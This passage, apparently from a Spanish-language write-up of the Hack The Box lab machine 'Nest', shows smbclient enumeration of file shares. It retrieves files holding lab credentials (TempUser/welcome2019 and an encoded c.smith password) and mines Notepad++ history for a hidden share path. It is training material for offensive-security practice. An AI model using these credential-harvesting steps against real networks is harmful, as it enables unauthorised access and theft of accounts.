&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd IT
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \IT\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \IT\*
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \IT\&amp;gt; cd ..
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Production
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;dsmb: \Production\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \Production\*
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Production\&amp;gt; cd ..
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Reports
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Reports\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \Reports\*
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Reports\&amp;gt; cd ..
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Shared
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;dsmb: \Shared\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:07:51 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:07:51 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Maintenance                         D        0  Wed Aug  7 13:07:32 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Templates                           D        0  Wed Aug  7 13:08:07 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\&amp;gt; cd Maintenance
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:07:32 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:07:32 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Maintenance Alerts.txt              A       48  Mon Aug  5 17:01:44 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; get &amp;#34;Maintenance Alerts.txt&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; cd ..\Templates
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:08:07 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:08:07 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  HR                                  D        0  Wed Aug  7 13:08:01 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Marketing                           D        0  Wed Aug  7 13:08:06 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; dir HR
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  HR                                  D        0  Wed Aug  7 13:08:01 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; cd HR
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\HR\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:08:01 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:08:01 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Welcome Email.txt                   A      425  Wed Aug  7 16:55:36 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\HR\&amp;gt; get &amp;#39;&lt;/span&gt;Welcome Email.txt&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Shared\Templates\HR\&amp;#39;&lt;/span&gt;Welcome
smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get &lt;span class=&#34;s2&#34;&gt;&amp;#34;Welcome Email.txt&amp;#34;&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;elcome Email.txt of size &lt;span class=&#34;m&#34;&gt;425&lt;/span&gt; as Welcome Email.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing
smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:08:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:08:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449704&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.&lt;/p&gt;
&lt;p&gt;Maintenance Alerts.txt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;There is currently no scheduled maintenance work
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Welcome Email.txt:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;We would like to extend a warm welcome to our newest member of staff, &amp;lt;FIRSTNAME&amp;gt; &amp;lt;SURNAME&amp;gt;

You will find your home folder in the following location: 
&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;HTB-NEST&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\&amp;lt;&lt;/span&gt;USERNAME&amp;gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; all systems have been &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; up &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you.

Username: TempUser
Password: welcome2019


Thank you
HR
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---csmith&#34;&gt;USER - C.Smith&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML &lt;code&gt;RU_config.xml&lt;/code&gt; el cual contiene credenciales especificamente de &lt;strong&gt;C.Smith&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Data
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;RU Scanner&amp;#34;&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:01:13 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:01:13 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  RU_config.xml                       A      &lt;span class=&#34;m&#34;&gt;270&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 13:49:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449668&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get RU_config.xml 
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U_config.xml of size &lt;span class=&#34;m&#34;&gt;270&lt;/span&gt; as RU_config.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;RU_config.xml:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;ConfigFile&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsd=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Port&amp;gt;&lt;/span&gt;389&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Port&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Username&amp;gt;&lt;/span&gt;c.smith&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Username&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Password&amp;gt;&lt;/span&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Password&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/ConfigFile&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un &amp;ldquo;archivo temporal&amp;rdquo; en &lt;code&gt;\Secure$\IT\Carl\Temp.txt&lt;/code&gt; el cual no existe.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:31:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:31:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  config.xml                          A     &lt;span class=&#34;m&#34;&gt;6451&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 17:01:25 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  shortcuts.xml                       A     &lt;span class=&#34;m&#34;&gt;2108&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:30:27 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449680&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get config.xml
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig.xml of size &lt;span class=&#34;m&#34;&gt;6451&lt;/span&gt; as config.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.7 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 7.7 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
root@aoiri:~/htb/nest# tail config.xml 
        &amp;lt;Find &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;redeem on&amp;#34;&lt;/span&gt; /&amp;gt;
        &amp;lt;Find &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;192&amp;#34;&lt;/span&gt; /&amp;gt;
        &amp;lt;Replace &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C_addEvent&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;/FindHistory&amp;gt;
    &amp;lt;History &lt;span class=&#34;nv&#34;&gt;nbMaxFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;15&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;inSubMenu&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;customLength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-1&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\windows\System32\drivers\etc\hosts&amp;#34;&lt;/span&gt; /&amp;gt;
        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\\HTB-NEST\Secure&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;\IT\Carl\Temp.txt&amp;#34;&lt;/span&gt; /&amp;gt;
        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\C.Smith\Desktop\todo.txt&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;/History&amp;gt;
&amp;lt;/NotepadPlus&amp;gt;
root@aoiri:~/htb/nest#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dicho Directorio nos llevo a encontrar el Proyecto RU.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Aug  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 08:47:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Aug  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 08:47:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  RU                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:36:45 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449639&lt;/span&gt; blocks available
